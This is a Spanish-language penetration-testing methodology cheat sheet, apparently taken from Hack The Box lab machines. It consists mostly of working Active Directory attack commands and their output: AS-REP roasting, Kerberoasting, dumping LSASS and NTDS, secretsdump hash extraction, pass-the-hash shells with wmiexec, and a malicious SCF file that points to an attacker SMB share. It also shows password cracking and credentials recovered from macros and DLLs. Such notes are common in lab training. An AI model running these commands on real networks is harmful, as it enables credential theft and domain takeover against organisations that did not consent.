# methodology

# Metodología

## ASPRepRoast Attack

```
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192
```

## Decrypt LSASS

```
pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
[...]
    == MSV ==
        Username: svc_backup
        Domain: BLACKFIELD
        LM: NA
        NT: 9658d1d1dcd9250115e2205d9f48400d
        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
luid 153705
    == MSV ==
        Username: Administrator
        Domain: BLACKFIELD
        LM: NA
        NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
        SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
```

## Dumpear NTDS

### Backup del System

```
reg save HKLM\SYSTEM system.bak
```

### Backup del NTDS

### Creación de unidad lógica temporal

**Fichero.txt**

```
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```

### Procesación con DiskShadow

```
diskshadow /s fichero.txt
```

### Copia de RoboCopy

```
robocopy /b z:\windows\ntds . ntds.bak
```

### Dumpeo hashes NT,LM

```
impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

### PassTheHash

```
wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>
```

### Kerberoasting Attack

```
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request
```

## SCF Malicioso

```
[Shell]
Command=2
IconFile=\\10.10.16.6\shared\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

## Microsoft Active Directory Certificate Services

### Generar certificados

```
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

## Tráfico de Red

### Obtener clave SSL para importar en WireShark

```
hflaccus@carpediem:/$ find \-name \*key 2>/dev/null | grep backdrop
./etc/ssl/certs/backdrop.carpediem.htb.key
```

```
hflaccus@carpediem:/etc/ssl/certs$ ls | grep backdrop
backdrop.carpediem.htb.crt
backdrop.carpediem.htb.key
```

## Desencriptar LSASS

```
pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
[...]
    == MSV ==
        Username: svc_backup
        Domain: BLACKFIELD
        LM: NA
        NT: 9658d1d1dcd9250115e2205d9f48400d
        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
luid 153705
    == MSV ==
        Username: Administrator
        Domain: BLACKFIELD
        LM: NA
        NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
        SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
```

## Obtener macros de documento

```
olevba -c CurrencyVolumeReport.xlsm
olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools
===============================================================================
FILE: CurrencyVolumeReport.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"

  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
```

### Crear diccionario de usuarios a partir de nombres

```
python3 /opt/SprayingToolkit/spindrift.py users.txt --format {f}.{last} > bruteusers
python3 /opt/SprayingToolkit/spindrift.py users.txt --format {first}.{last} > bruteusers
python3 /opt/SprayingToolkit/spindrift.py users.txt --format {f}.{last} >> bruteusers
python3 /opt/SprayingToolkit/spindrift.py users.txt --format {f}{last} >> bruteusers
python3 /opt/SprayingToolkit/spindrift.py users.txt --format {first}{l} >> bruteusers
python3 /opt/SprayingToolkit/spindrift.py users.txt --format {first}.{l} >> bruteusers
```

### Certificado PFX

### Crack hash

```
pfx2john staff.pfx > hash

john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)
1g 0:00:01:21 DONE (2023-02-04 17:09) 0.01227g/s 67319p/s 67319c/s 67319C/s misssnail..missnona16
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Importar al navegador

Permite tener acceso a recursos que de primera devuelven un código de estado 403, por ejemplo

![https://rubbxalc.github.io/writeups/assets/img/Search-htb/17.png](https://rubbxalc.github.io/writeups/assets/img/Search-htb/17.png)

image

## Strings | Obtener más información con un encoder

```
strings -e l MultimasterAPI.dll | grep password
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```